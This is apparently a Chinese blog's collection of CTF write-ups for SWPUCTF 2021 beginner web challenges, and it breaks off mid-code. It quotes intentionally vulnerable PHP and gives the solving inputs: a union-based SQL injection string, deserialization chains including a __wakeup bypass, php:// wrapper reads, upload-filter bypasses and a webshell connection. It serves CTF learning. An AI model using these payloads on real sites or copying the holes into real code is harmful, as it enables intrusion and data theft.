</div></aside><div class="l_main" id="main">





<div class="article banner top">
  <div class="content">
    <div class="top bread-nav footnote"><div class="left"><div class="flex-row" id="breadcrumb"><a class="cap breadcrumb" href="/">主页</a>
<span class="sep"></span><a class="cap breadcrumb" href="/">文章</a><span class="sep"></span><a class="cap breadcrumb-link" href="/categories/CTF%E8%B5%9B%E4%BA%8B/">CTF赛事</a></div>
<div class="flex-row" id="post-meta"><span class="text created">发布于：<time datetime="2024-03-03T07:41:54.169Z">2024-03-03</time></span><span class="sep updated"></span><span class="text updated">更新于：<time datetime="2024-04-07T06:50:37.856Z">2024-04-07</time></span></div></div></div>
    
  </div>
  </div><article class="md-text content"><h1 id="swpuctf-2021-新生赛gift_f12">[SWPUCTF 2021 新生赛]gift_F12</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303154602248.png" alt></p>
<p>简单的js源码泄露</p>
<h1 id="swpuctf-2021-新生赛jicao">[SWPUCTF 2021 新生赛]jicao</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-string">'index.php'</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);
<span class="hljs-variable">$id</span>=<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'id'</span>];
<span class="hljs-variable">$json</span>=<span class="hljs-title function_ invoke__">json_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'json'</span>],<span class="hljs-literal">true</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-variable">$id</span>==<span class="hljs-string">"wllmNB"</span>&amp;&amp;<span class="hljs-variable">$json</span>[<span class="hljs-string">'x'</span>]==<span class="hljs-string">"wllm"</span>)
{<span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;}
<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs scss">只需要id=wllmNB,随后get传参?json={"x":<span class="hljs-string">"wllm"</span>}</code></pre>
<p>但这里如果用bp的话，需要添加<code>Content-Type: application/x-www-form-**urlencoded</code>才可以</p>
<p>因为有post传参，因此必须进行url编码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303155609807.png" alt="image-20240303155609807"></p>
<h1 id="swpuctf-2021-新生赛easy_md5">[SWPUCTF 2021 新生赛]easy_md5</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> 
 <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
 <span class="hljs-keyword">include</span> <span class="hljs-string">'flag2.php'</span>;
 
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>]) &amp;&amp; <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>])){
    <span class="hljs-variable">$name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
    <span class="hljs-variable">$password</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'password'</span>];
    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$name</span> != <span class="hljs-variable">$password</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$name</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$password</span>)){
        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
    }
    <span class="hljs-keyword">else</span> {
        <span class="hljs-keyword">echo</span> <span class="hljs-string">"wrong!"</span>;
    }
 
}
<span class="hljs-keyword">else</span> {
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'wrong!'</span>;
}
<span class="hljs-meta">?&gt;</span>
wrong!</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303160406743.png" alt="image-20240303160406743"></p>
<h1 id="swpuctf-2021-新生赛include">[SWPUCTF 2021 新生赛]include</h1>
<p>页面说让我们串file参数试试，传入之后知道是伪协议读取</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"allow_url_include"</span>,<span class="hljs-string">"on"</span>);
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-type: text/html; charset=utf-8"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-variable">$file</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'file'</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>)){
    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
    <span class="hljs-keyword">echo</span> <span class="hljs-string">'flag 在flag.php中'</span>;
}<span class="hljs-keyword">else</span>{
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"传入一个file试试"</span>;
}
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"&lt;/br&gt;"</span>;
<span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$file</span>);
<span class="hljs-meta">?&gt;</span> flag 在flag.php中</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303161800565.png" alt="image-20240303161800565"></p>
<h1 id="swpuctf-2021-新生赛easy_sql">[SWPUCTF 2021 新生赛]easy_sql</h1>
<p>简单SQL注入</p>
<pre><code class="hljs scss">?wllm=-<span class="hljs-number">1</span>' union select <span class="hljs-number">1</span>, <span class="hljs-built_in">group_concat</span>(flag), <span class="hljs-number">3</span> from test_tb--+</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303163823373.png" alt="image-20240303163823373"></p>
<h1 id="swpuctf-2021-新生赛easyrce">[SWPUCTF 2021 新生赛]easyrce</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303164036596.png" alt="image-20240303164036596"></p>
<h1 id="swpuctf-2021-新生赛caidao">[SWPUCTF 2021 新生赛]caidao</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165909827.png" alt="image-20240303165909827"></p>
<p>RCE或者蚁剑连接</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165922060.png" alt="image-20240303165922060"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165930107.png" alt="image-20240303165930107"></p>
<p>不过这里蚁剑连接时候总是报错，之后修改了编码方式才通过。不理解（被waf了？？？）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303165955408.png" alt="image-20240303165955408"></p>
<h1 id="swpuctf-2021-新生赛do_you_know_http">[SWPUCTF 2021 新生赛]Do_you_know_http</h1>
<p>第一个改UA头即可，第二个改IP为本地，302跳转即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303173135507.png" alt="image-20240303173135507"></p>
<h1 id="第五空间-2021webftp">[第五空间 2021]WebFTP</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303174306125.png" alt="image-20240303174306125"></p>
<p>不知道考什么，直接扫目录得到phpinfo.php，搜索flag即可</p>
<h1 id="swpuctf-2021-新生赛babyrce">[SWPUCTF 2021 新生赛]babyrce</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>])) {
  <span class="hljs-variable">$ip</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'url'</span>];
  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">"/ /"</span>, <span class="hljs-variable">$ip</span>)){
      <span class="hljs-keyword">die</span>(<span class="hljs-string">'nonono'</span>);
  }
  <span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">shell_exec</span>(<span class="hljs-variable">$ip</span>);
  <span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303174740360.png" alt="image-20240303174740360"></p>
<h1 id="swpuctf-2021-新生赛ez_unserialize">[SWPUCTF 2021 新生赛]ez_unserialize</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">"cl45s.php"</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>{

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;

    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">"user"</span>;
        <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">"123456"</span>;
    }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">"ctf"</span>){
            <span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);
            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
        }<span class="hljs-keyword">else</span>{
            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;admin;
            <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;
            <span class="hljs-keyword">echo</span> <span class="hljs-string">"Just a bit more!"</span>;
        }
    }
}

<span class="hljs-variable">$p</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>];
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$p</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<p>链子如下：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">wllm</span></span>{

    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;

}
<span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">wllm</span>();
<span class="hljs-variable">$pop</span>-&gt;admin = <span class="hljs-string">'admin'</span>;
<span class="hljs-variable">$pop</span>-&gt;passwd = <span class="hljs-string">'ctf'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>));

<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303175341797.png" alt="image-20240303175341797"></p>
<p>这里放一个对上述构造函数以及反序列化的优先级解释（我感觉GPT回答没错）</p>
<p>在 PHP 的序列化中，如果在序列化字符串中指定了对象的属性值，那么在反序列化时，会使用这些指定的属性值来初始化对象，而不会调用构造函数。因此，在传入序列化字符串时，你可以这样指定 admin 和 passwd 的值：</p>
<pre><code class="hljs scss">O:<span class="hljs-number">4</span>:<span class="hljs-string">"wllm"</span>:<span class="hljs-number">2</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"user"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"passwd"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"123456"</span>;}</code></pre>
<p>这里的优先级是序列化字符串中指定的属性值优先于构造函数中的默认值。反序列化时会使用这些指定的属性值来初始化对象的属性。</p>
<h1 id="swpuctf-2021-新生赛easyupload20">[SWPUCTF 2021 新生赛]easyupload2.0</h1>
<p>这道题也是没想到，因为基本没见过（但确实基础。。。）</p>
<p>这里上传试了几次发现ban了php、ini、htaccess，我们可以考虑PHP文件其他的拓展名php3、php5、phtml、pht等我们一一尝试</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303185953676.png" alt="image-20240303185953676"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303185944862.png" alt="image-20240303185944862"></p>
<p>找环境变量或者phpinfo都可</p>
<h1 id="swpuctf-2021-新生赛easyupload10">[SWPUCTF 2021 新生赛]easyupload1.0</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190251141.png" alt="image-20240303190251141"></p>
<p>发现修改为该MIME类型即可</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190329438.png" alt="image-20240303190329438"></p>
<h1 id="swpuctf-2021-新生赛no_wakeup">[SWPUCTF 2021 新生赛]no_wakeup</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>

<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-type:text/html;charset=utf-8"</span>);
<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-string">"class.php"</span>);

<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>{


        <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;
        <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;admin =<span class="hljs-string">"user"</span>;
            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-string">"123456"</span>;
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-variable language_">$this</span>-&gt;passwd = <span class="hljs-title function_ invoke__">sha1</span>(<span class="hljs-variable">$this</span>-&gt;passwd);
        }

        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>{
            <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;admin === <span class="hljs-string">"admin"</span> &amp;&amp; <span class="hljs-variable language_">$this</span>-&gt;passwd === <span class="hljs-string">"wllm"</span>){
                <span class="hljs-keyword">include</span>(<span class="hljs-string">"flag.php"</span>);
                <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
            }<span class="hljs-keyword">else</span>{
                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;passwd;
                <span class="hljs-keyword">echo</span> <span class="hljs-string">"No wake up"</span>;
            }
        }
    }

<span class="hljs-variable">$Letmeseesee</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'p'</span>];
<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$Letmeseesee</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HaHaHa</span></span>{
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$admin</span>;
    <span class="hljs-keyword">public</span> <span class="hljs-variable">$passwd</span>;
}
<span class="hljs-variable">$pop</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HaHaHa</span>();
<span class="hljs-variable">$pop</span>-&gt;admin = <span class="hljs-string">'admin'</span>;
<span class="hljs-variable">$pop</span>-&gt;passwd = <span class="hljs-string">'wllm'</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$pop</span>);

<span class="hljs-meta">?&gt;</span></code></pre>
<pre><code class="hljs scss">O:<span class="hljs-number">6</span>:<span class="hljs-string">"HaHaHa"</span>:<span class="hljs-number">6</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"admin"</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"passwd"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"wllm"</span>;}<span class="hljs-comment">//修改属性个数即可</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303190723699.png" alt="image-20240303190723699"></p>
<h1 id="swpuctf-2021-新生赛pseudoprotocols">[SWPUCTF 2021 新生赛]PseudoProtocols</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303191538892.png" alt="image-20240303191538892"></p>
<p>看了提示才想到伪协议</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">"max_execution_time"</span>, <span class="hljs-string">"180"</span>);
<span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-keyword">include</span>(<span class="hljs-string">'flag.php'</span>);
<span class="hljs-variable">$a</span>= <span class="hljs-variable">$_GET</span>[<span class="hljs-string">"a"</span>];
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$a</span>)&amp;&amp;(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">'r'</span>)) === <span class="hljs-string">'I want flag'</span>){
    <span class="hljs-keyword">echo</span> <span class="hljs-string">"success\n"</span>;
    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;
}
<span class="hljs-meta">?&gt;</span></code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192415788.png" alt="image-20240303192415788"></p>
<p>看到这种<code>file_get_contents</code>的用法，就是php://input，当然data协议也可</p>
<h1 id="swpuctf-2021-新生赛easyupload30">[SWPUCTF 2021 新生赛]easyupload3.0</h1>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192838844.png" alt="image-20240303192838844"></p>
<p>可以看到允许htaccess上传</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303192914464.png" alt="image-20240303192914464"></p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240303193005353.png" alt="image-20240303193005353"></p>
<h1 id="swpuctf-2021-新生赛hardrce">[SWPUCTF 2021 新生赛]hardrce</h1>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Content-Type:text/html;charset=utf-8"</span>);
